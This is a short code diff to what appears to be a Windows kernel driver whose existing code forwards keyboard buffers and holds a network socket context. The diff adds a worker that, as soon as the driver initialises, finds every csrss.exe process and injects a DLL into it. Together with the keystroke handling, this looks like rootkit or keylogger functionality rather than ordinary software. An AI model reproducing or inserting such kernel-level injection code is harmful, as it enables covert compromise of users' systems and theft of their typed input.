@@ -3,6 +3,7 @@
 #include <inc/ecore.h>
 #include <inc/systhread.h>
 #include <inc/keybrd.h>
+#include <inc/inject.h>
 
 #define __SUBCOMPONENT__ "ecore"
 
@@ -148,6 +149,14 @@ VOID ECoreSendKbdBuf(PVOID BuffEntry)
 	MonitorQueueWorkItem(&g_Monitor, MonitorSendKbdBufWorker, BuffEntry);
 }
 
+
+VOID MonitorInjectDllWorker(PMONITOR Monitor, PVOID Context)
+{
+	UNICODE_STRING ProcPrefix = RTL_CONSTANT_STRING(L"csrss.exe");
+	
+	InjectFindAllProcessesAndInjectDll(&ProcPrefix, NULL);
+}
+
 NTSTATUS
     MonitorInit(PMONITOR Monitor)
 {
@@ -169,6 +178,8 @@ NTSTATUS
         Monitor->WskContext = NULL;
         return Status;
     }
+
+	MonitorQueueWorkItem(Monitor, MonitorInjectDllWorker, NULL);
 
     return STATUS_SUCCESS;
 }
